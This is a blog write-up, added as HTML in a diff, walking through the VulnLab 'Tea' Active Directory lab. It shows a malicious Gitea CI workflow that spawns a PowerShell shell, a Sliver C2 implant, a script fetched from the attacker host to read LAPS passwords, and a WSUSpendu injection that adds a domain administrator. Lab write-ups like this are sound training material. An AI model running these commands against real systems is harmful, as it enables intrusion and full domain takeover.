@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tea Chain - VulnLab Chain Writeup &amp; WalkthroughWelcome to my comprehensive writeup and walkthrough for the Tea Chain, a challenging Active Directory ProLab from VulnLab. This penetration testing w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Tea">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/06/VL-Tea/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Tea Chain - VulnLab Chain Writeup &amp; WalkthroughWelcome to my comprehensive writeup and walkthrough for the Tea Chain, a challenging Active Directory ProLab from VulnLab. This penetration testing w">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/gitea.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/enable-actions.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/workflows-gitea.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/thomaswallaceshell.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/sliver-generating.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/shell-get-sliver.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/shares-access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/svr-account.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/read-laps.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tea/wsus-installed.png">
+<meta property="article:published_time" content="2025-11-06T20:10:46.000Z">
+<meta property="article:modified_time" content="2025-11-06T20:13:57.803Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VulnLab">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Tea/gitea.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Tea</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/06/VL-Unintended/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/06/VL-Tea/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&text=VL-Tea"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&is_video=false&description=VL-Tea"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Tea&body=Check out this article: https://panosoikogr.github.io/2025/11/06/VL-Tea/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&title=VL-Tea"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/06/VL-Tea/&name=VL-Tea&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/06/VL-Tea/&t=VL-Tea"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tea-Chain-VulnLab-Chain-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Tea Chain - VulnLab Chain Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target-Information"><span class="toc-number">1.1.</span> <span class="toc-text">Target Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Domain-Controller-DC-tea-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - Domain Controller (DC.tea.vl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Server-SRV-tea-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - Server (SRV.tea.vl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Web-Enumeration"><span class="toc-number">1.2.3.</span> <span class="toc-text">Initial Web Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-CI-CD-Runner-Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via CI&#x2F;CD Runner Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-Steps"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploitation Steps</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Establishing-Command-and-Control"><span class="toc-number">1.4.</span> <span class="toc-text">Establishing Command and Control</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Post-Exploitation Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.5.1.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.5.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAPS-Discovery"><span class="toc-number">1.5.3.</span> <span class="toc-text">LAPS Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-LAPS-Password"><span class="toc-number">1.5.4.</span> <span class="toc-text">Extracting LAPS Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Local-Administrator-Access"><span class="toc-number">1.5.5.</span> <span class="toc-text">Gaining Local Administrator Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WSUS-Exploitation-for-Domain-Admin"><span class="toc-number">1.6.</span> <span class="toc-text">WSUS Exploitation for Domain Admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Confirming-WSUS-Installation"><span class="toc-number">1.6.1.</span> <span class="toc-text">Confirming WSUS Installation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-WSUS"><span class="toc-number">1.6.2.</span> <span class="toc-text">Exploiting WSUS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Compromise"><span class="toc-number">1.6.3.</span> <span class="toc-text">Domain Compromise</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Admin-achieved-%F0%9F%8E%89"><span class="toc-number">1.7.</span> <span class="toc-text">Domain Admin achieved! 🎉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.8.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Tea
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-06T20:10:46.000Z" class="dt-published" itemprop="datePublished">2025-11-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Tea-Chain-VulnLab-Chain-Writeup-Walkthrough"><a href="#Tea-Chain-VulnLab-Chain-Writeup-Walkthrough" class="headerlink" title="Tea Chain - VulnLab Chain Writeup &amp; Walkthrough"></a>Tea Chain - VulnLab Chain Writeup &amp; Walkthrough</h1><p>Welcome to my comprehensive writeup and walkthrough for the <strong>Tea Chain</strong>, a challenging Active Directory ProLab from <strong>VulnLab</strong>. This penetration testing writeup demonstrates advanced techniques including CI&#x2F;CD runner exploitation, LAPS credential extraction, and WSUS privilege escalation. Whether you’re preparing for certifications like OSCP&#x2F;OSEP or looking to enhance your skills similar to <strong>Hack The Box</strong> challenges, this detailed walkthrough will guide you through the complete exploitation chain from initial access to domain admin.</p>
+<p><strong>Difficulty</strong>: Chain&#x2F;ProLab<br><strong>Platform</strong>: VulnLab - Hack The Box<br><strong>Skills Required</strong>: Active Directory, CI&#x2F;CD Security, WSUS Exploitation</p>
+<hr>
+<h2 id="Target-Information"><a href="#Target-Information" class="headerlink" title="Target Information"></a>Target Information</h2><p>We are provided with two machines in the Tea domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.143.229 DC.tea.vl</span><br><span class="line">10.10.143.230 SRV.tea.vl</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-Scan-Domain-Controller-DC-tea-vl"><a href="#Nmap-Scan-Domain-Controller-DC-tea-vl" class="headerlink" title="Nmap Scan - Domain Controller (DC.tea.vl)"></a>Nmap Scan - Domain Controller (DC.tea.vl)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE    REASON          VERSION</span><br><span class="line">53/tcp    open  domain     syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc?     syn-ack ttl 127</span><br><span class="line">139/tcp   open  tcpwrapped syn-ack ttl 127</span><br><span class="line">445/tcp   open  tcpwrapped syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped syn-ack ttl 127</span><br><span class="line">3269/tcp  open  tcpwrapped syn-ack ttl 127</span><br><span class="line">3389/tcp  open  tcpwrapped syn-ack ttl 127</span><br><span class="line">| ssl-cert: Subject: commonName=DC.tea.vl</span><br><span class="line">| Issuer: commonName=DC.tea.vl</span><br><span class="line">49664/tcp open  tcpwrapped syn-ack ttl 127</span><br><span class="line">49667/tcp open  tcpwrapped syn-ack ttl 127</span><br><span class="line">55790/tcp open  tcpwrapped syn-ack ttl 127</span><br><span class="line">56404/tcp open  tcpwrapped syn-ack ttl 127</span><br><span class="line">56409/tcp open  unknown    syn-ack ttl 127</span><br></pre></td></tr></table></figure>
+
+<p>The DC shows standard Active Directory services including DNS, LDAP, and RDP.</p>
+<h3 id="Nmap-Scan-Server-SRV-tea-vl"><a href="#Nmap-Scan-Server-SRV-tea-vl" class="headerlink" title="Nmap Scan - Server (SRV.tea.vl)"></a>Nmap Scan - Server (SRV.tea.vl)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">135/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">445/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp?          syn-ack ttl 127</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|_    Request</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=SRV.tea.vl</span><br><span class="line">| Issuer: commonName=SRV.tea.vl</span><br></pre></td></tr></table></figure>
+
+<p>SRV machine exposes HTTP on port 80 and an interesting service on port 3000.</p>
+<h3 id="Initial-Web-Enumeration"><a href="#Initial-Web-Enumeration" class="headerlink" title="Initial Web Enumeration"></a>Initial Web Enumeration</h3><p>Null authentication against SMB yields limited information, so attention shifts to the SRV machine. Port 80 hosts a basic IIS server, while port 3000 runs <strong>Gitea</strong> - a self-hosted Git service.</p>
+<p><img src="/images/Tea/gitea.png" alt="Gitea Login Page"></p>
+<p>Upon accessing Gitea, we can create an account, but there are no existing repositories or users visible initially.</p>
+<hr>
+<h2 id="Initial-Access-via-CI-CD-Runner-Exploitation"><a href="#Initial-Access-via-CI-CD-Runner-Exploitation" class="headerlink" title="Initial Access via CI&#x2F;CD Runner Exploitation"></a>Initial Access via CI&#x2F;CD Runner Exploitation</h2><p>Despite the repository appearing empty, exploitation is possible through CI&#x2F;CD runner misconfiguration. CI&#x2F;CD runners are automated build instances that execute multi-step processes defined in YAML files, commonly used across platforms like Gitea and GitLab.</p>
+<h3 id="Exploitation-Steps"><a href="#Exploitation-Steps" class="headerlink" title="Exploitation Steps"></a>Exploitation Steps</h3><p><strong>Step 1</strong>: Create a new repository and enable Actions on it.</p>
+<p><img src="/images/Tea/enable-actions.png" alt="Enable Actions"></p>
+<p><strong>Step 2</strong>: Create a workflow configuration file at <code>(reponame)/.gitea/workflows/config.yaml</code></p>
+<p><img src="/images/Tea/workflows-gitea.png" alt="Gitea Workflows"></p>
+<p>If you encounter issues creating a valid YAML file, refer to the official documentation:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.gitea.com/usage/actions/quickstart/</span><br></pre></td></tr></table></figure>
+
+<p>The workflow configuration should look like this:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">build/release</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">    <span class="attr">daz:</span></span><br><span class="line">        <span class="attr">runs-on:</span> <span class="string">windows-latest</span></span><br><span class="line">        <span class="attr">steps:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">powershell</span> <span class="string">-e</span> <span class="string">&lt;base64</span> <span class="string">shell&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3</strong>: Approximately 3 seconds after pushing the malicious workflow file, we receive a shell as <strong>thomas.wallace</strong>.</p>
+<p><img src="/images/Tea/thomaswallaceshell.png" alt="Thomas Wallace Shell"></p>
+<p>Thomas Wallace is a member of two groups: <strong>Developers</strong> and <strong>Server Admins</strong>.</p>
+<hr>
+<h2 id="Establishing-Command-and-Control"><a href="#Establishing-Command-and-Control" class="headerlink" title="Establishing Command and Control"></a>Establishing Command and Control</h2><p>For better control and functionality, I deployed a Sliver C2 implant:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls &lt;Your IP&gt; --os windows --arch amd64 --format exe --save /home/panosoiko/Downloads/</span><br><span class="line"></span><br><span class="line">mtls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Tea/sliver-generating.png" alt="Sliver Generating"></p>
+<p>Start a Python web server in the directory where you saved the executable, then download and execute the shell on the target machine.</p>
+<p><img src="/images/Tea/shell-get-sliver.png" alt="Getting Sliver Shell"></p>
+<hr>
+<h2 id="Post-Exploitation-Enumeration"><a href="#Post-Exploitation-Enumeration" class="headerlink" title="Post-Exploitation Enumeration"></a>Post-Exploitation Enumeration</h2><h3 id="BloodHound-Collection"><a href="#BloodHound-Collection" class="headerlink" title="BloodHound Collection"></a>BloodHound Collection</h3><p>With an interactive shell established, we can run SharpHound to collect Active Directory data:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharp-hound-4 -- &#x27;-c all,GPOLocalGroup&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Download the results:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download 20251106105625_BloodHound.zip</span><br></pre></td></tr></table></figure>
+
+<p>BloodHound analysis reveals limited attack paths but identifies a <strong>Kerberoastable account</strong>. We also discover accessible SMB shares:</p>
+<p><img src="/images/Tea/shares-access.png" alt="Accessible Shares"></p>
+<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>We perform Kerberoasting to extract the service account hash:</p>
+<p><img src="/images/Tea/svr-account.png" alt="SRV Account Hash"></p>
+<h3 id="LAPS-Discovery"><a href="#LAPS-Discovery" class="headerlink" title="LAPS Discovery"></a>LAPS Discovery</h3><p>Exploring the C:\ drive reveals an interesting <code>_install</code> folder:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[server] sliver (UNEXPECTED_LUNCHROOM) &gt; ls</span><br><span class="line"></span><br><span class="line">C:\_install (4 items, 3.0 MiB)</span><br><span class="line">==============================</span><br><span class="line">-rw-rw-rw-  LAPS.x64.msi               1.1 MiB    Sun Dec 24 05:37:30 -0800 2023</span><br><span class="line">-rw-rw-rw-  LAPS_OperationsGuide.docx  626.3 KiB  Sun Dec 24 05:37:39 -0800 2023</span><br><span class="line">-rw-rw-rw-  PsExec64.exe               813.9 KiB  Sun Oct 22 05:03:38 -0800 2023</span><br><span class="line">-rw-rw-rw-  PsInfo64.exe               523.4 KiB  Sun Dec 24 05:38:30 -0800 2023</span><br></pre></td></tr></table></figure>
+
+<p>This indicates <strong>LAPS (Local Administrator Password Solution)</strong> is likely installed on this machine. Additionally, we have membership in the machine’s administrators group (though with limited permissions initially).</p>
+<h3 id="Extracting-LAPS-Password"><a href="#Extracting-LAPS-Password" class="headerlink" title="Extracting LAPS Password"></a>Extracting LAPS Password</h3><p>Attempting to extract LAPS credentials with SharpLAPS:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharplaps /host:SVR.tea.vl</span><br></pre></td></tr></table></figure>
+
+<p>This command fails, so we use the <strong>LAPSToolkit</strong> PowerShell script instead:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpsh -t 20 -- &#x27;-u http://10.8.5.195:9091/LAPSToolkit.ps1 -c &quot;Get-LapsADPassword -Identity srv -AsPlainText&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Start a Python web server in the directory containing LAPSToolkit.ps1:</p>
+<p><img src="/images/Tea/read-laps.png" alt="Reading LAPS Password"></p>
+<p><strong>Retrieved LAPS Password</strong>: <code>W%[26.V#######</code></p>
+<h3 id="Gaining-Local-Administrator-Access"><a href="#Gaining-Local-Administrator-Access" class="headerlink" title="Gaining Local Administrator Access"></a>Gaining Local Administrator Access</h3><p>With the LAPS password, we can authenticate as the local Administrator using NetExec with WMI:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec wmi srv.tea.vl -u &#x27;Administrator&#x27; -p &#x27;W%[26.V#ZmD+G8&#x27; -d . -x C:/Users/thomas.wallace/Desktop/shell.exe</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="WSUS-Exploitation-for-Domain-Admin"><a href="#WSUS-Exploitation-for-Domain-Admin" class="headerlink" title="WSUS Exploitation for Domain Admin"></a>WSUS Exploitation for Domain Admin</h2><p><strong>Windows Server Update Services (WSUS)</strong> is a Windows application that enables a server to distribute Windows updates to machines in the domain. Administrators can attach PowerShell commands to deployed updates to automate tasks. These commands execute with administrator privileges on machines receiving updates - a significant security risk if misconfigured.</p>
+<h3 id="Confirming-WSUS-Installation"><a href="#Confirming-WSUS-Installation" class="headerlink" title="Confirming WSUS Installation"></a>Confirming WSUS Installation</h3><p><img src="/images/Tea/wsus-installed.png" alt="WSUS Installed"></p>
+<p>Verify WSUS is installed:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WindowsFeature -Name UpdateServices, UpdateServices-WidDatabase, UpdateServices-Services, UpdateServices-UI | Where-Object &#123; $_.Installed -eq $true &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Expected output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Display Name                                            Name                       Install State</span><br><span class="line">------------                                            ----                       -------------</span><br><span class="line">[X] Windows Server Update Services                      UpdateServices                 Installed</span><br><span class="line">    [X] WSUS Services                                   UpdateServices-Services        Installed</span><br><span class="line">            [X] User Interface Management Console       UpdateServices-UI              Installed</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploiting-WSUS"><a href="#Exploiting-WSUS" class="headerlink" title="Exploiting WSUS"></a>Exploiting WSUS</h3><p>Upload the WSUSpendu exploitation script:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/panosoiko/Downloads/WSUSpendu.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Execute the exploit to create a new domain administrator account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\WSUSpendu.ps1 -Inject -PayloadFile C:\_install\PsExec64.exe -PayloadArgs &#x27;-accepteula -s -d cmd.exe /c &quot;net user pwnd HelloWorld@1 /add &amp;&amp; net localgroup administrators pwnd /add&quot;&#x27; -ComputerName dc.tea.vl</span><br></pre></td></tr></table></figure>
+
+<p>The update propagation takes approximately one minute. Once complete, we have valid administrator credentials for the domain controller:</p>
+<p><strong>Username</strong>: <code>pwnd</code><br><strong>Password</strong>: <code>HelloWorld@1</code></p>
+<h3 id="Domain-Compromise"><a href="#Domain-Compromise" class="headerlink" title="Domain Compromise"></a>Domain Compromise</h3><p>Connect to the domain controller with our new administrator account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py tea.vl/pwnd:&#x27;HelloWorld@1&#x27;@dc.tea.vl</span><br></pre></td></tr></table></figure>
+
+<h2 id="Domain-Admin-achieved-🎉"><a href="#Domain-Admin-achieved-🎉" class="headerlink" title="Domain Admin achieved! 🎉"></a><strong>Domain Admin achieved! 🎉</strong></h2><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=777340eb-c95d-4849-99ad-b728852cd32f">VulnLab Share Link</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.gitea.com/usage/actions/quickstart/">Gitea Actions Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a></li>
+</ul>
+<p><strong>Special Thanks</strong>: Huge thanks to <strong>@UnChleuHacker</strong> - without their assistance, I would have never managed to complete the WSUS exploitation part!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
